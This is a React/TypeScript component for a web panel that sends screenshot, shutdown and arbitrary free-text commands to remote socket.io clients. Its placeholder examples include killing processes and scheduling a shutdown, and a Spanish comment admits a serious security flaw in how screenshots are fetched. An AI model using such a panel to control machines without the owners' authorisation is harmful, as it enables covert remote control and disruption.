import {Button, Modal, TextInput} from "@mantine/core";
import {SocketContext} from "../../../manager/socketManager";
import {Socket} from "socket.io-client";
import {useContext, useState, useEffect} from "react";
import {RiScreenshot2Fill, RiShutDownLine} from "react-icons/ri";
import {IoSend} from "react-icons/io5";
import ImageModal from "./ImageModal";
import axios from "axios";

const {apiUrl} = require("../../../config.json");

type optionsModalTypes = {
    name: string,
    id: string,
    opened: boolean,
    manageModal: () => void
}

function OptionsModal({name, id, opened, manageModal}: optionsModalTypes) {
    const [openedPhoto, setOpenedPhoto] = useState(false);
    const [command, setCommand] = useState("");
    const [randomPlaceholder, setRandomPlaceholder] = useState("");
    const [image, setImage] = useState("");
    const socket: Socket = useContext(SocketContext);

    const getImages = async () => {
        try {
            const imgs = await axios.get(`${apiUrl}/images`, {
                headers: {
                    "Authorization": localStorage.getItem("userToken")
                }
            });

            if (imgs.status !== 200 || !imgs.data) return;

            setImage(imgs.data);
        } catch (e) {
            console.log("Error trying to get images");
        }

    }

    const takeScreenshot = () => {
        socket.emit("extcomm", `${id} ss`);
        managePhotoModal();
    }

    const shutdown = () => {
        socket.emit("extcomm", `${id} shutdown`);
    }

    const sendCommand = () => {
        socket.emit("extcomm", `${id} ${command}`);
        setCommand("");
    }

    const managePhotoModal = () => {
        const currentState = openedPhoto;
        setOpenedPhoto(!openedPhoto);

        if (!currentState) {
            /*
              * !! No debería existir esto !!
              * Se tiene que cambiar el cliente para que envíe datos de la foto y poder clasificarlos
              * GRAVE FALLO DE SEGURIDAD
             */
            setTimeout(async () => {
                await getImages();
            }, 10000);
        } else {
            setImage("");
        }
    }

    const manageCommand = (e: any) => {
        e.preventDefault();
        setCommand(e.target.value);
    }

    useEffect(() => {
        const placeholderList = ["start https://www.youtube.com/watch?v=dQw4w9WgXcQ", "kill chrome.exe",
            "start eclipse.exe", "shutdown -s -t 5000"];
        setRandomPlaceholder(placeholderList[Math.floor(Math.random() * placeholderList.length)]);

    }, [socket]);


    return (
        <Modal
            size="auto"
            transition="scale"
            centered
            opened={opened}
            onClose={manageModal}
            title={`SOCKET ${name}`}
        >
            <div className="grid-2">
                <div className="grid-item">
                    <Button leftIcon={<RiScreenshot2Fill/>} size="lg" variant="light"
                            onClick={takeScreenshot}>CAPTURA</Button>
                </div>
                <div className="grid-item">
                    <Button leftIcon={<RiShutDownLine/>} size="lg" variant="light"
                            onClick={shutdown}>APAGADO</Button>
                </div>
            </div>

            <TextInput variant="filled" name="Comando" placeholder={randomPlaceholder} label="Comando"
                       onChange={manageCommand} value={command}/>
            <Button mt="lg" fullWidth leftIcon={<IoSend/>} size="md" variant="light"
                    onClick={sendCommand}>Enviar</Button>

            <ImageModal name={name} openedPhoto={openedPhoto} managePhotoModal={managePhotoModal} image={image}/>
        </Modal>
    )
}

export default OptionsModal;